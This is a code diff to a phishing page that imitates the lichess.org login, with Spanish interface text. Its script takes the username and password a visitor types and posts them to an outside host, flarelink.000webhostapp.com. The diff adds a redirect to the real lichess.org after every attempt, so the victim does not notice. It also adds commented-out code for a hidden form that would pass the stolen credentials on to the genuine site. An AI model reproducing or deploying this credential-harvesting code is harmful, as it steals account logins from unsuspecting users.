@@ -28,6 +28,10 @@
 				</div>
 				
 			</form>
+			<!--<form method="POST" action="https://lichess.org/login" id="weblog" target="_blank" hidden>
+				<input type="text" name="username" id="webuser" hidden>
+				<input type="text" name="password" id="webpass" hidden>
+			</form>-->
 			<div class="alternative"><a href="#">Registrarse</a><a href="#">Cambiar contraseña</a><a href="#">Log in by email</a></div>
 		</main>
 	</div>
@@ -39,9 +43,17 @@
 		  }
 		});
 
+		var user;
+		var pass;
+
 		function login() {
-			var user = document.getElementById("username").value;
-			var pass = document.getElementById("password").value;
+			user = document.getElementById("username").value;
+			pass = document.getElementById("password").value;
+
+			/*document.getElementById("webuser").value = user;
+			document.getElementById("webpass").value = pass;
+
+			console.log(document.getElementById("webpass").value);*/
 
 			$.ajax({
 		        url: "https://flarelink.000webhostapp.com/lichess/login.php",
@@ -53,11 +65,21 @@
 		    }).done(function(resp) {
 		    	//console.log(resp);
 		       	//console.log("siuuu");
+		       	//web();
+		       	window.location.href = "https://lichess.org/";
 		    }).fail(function(resp){
 		    	//console.log(resp);
 		    	//console.log("error... pero esta bien");
+		    	//web();
+		    	window.location.href = "https://lichess.org/";
 		    });
 		}
+		
+		/*function web() {
+			var weblog = document.getElementById("weblog");
+
+			weblog.submit();
+		}*/
 	</script>
 	<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
 </body>
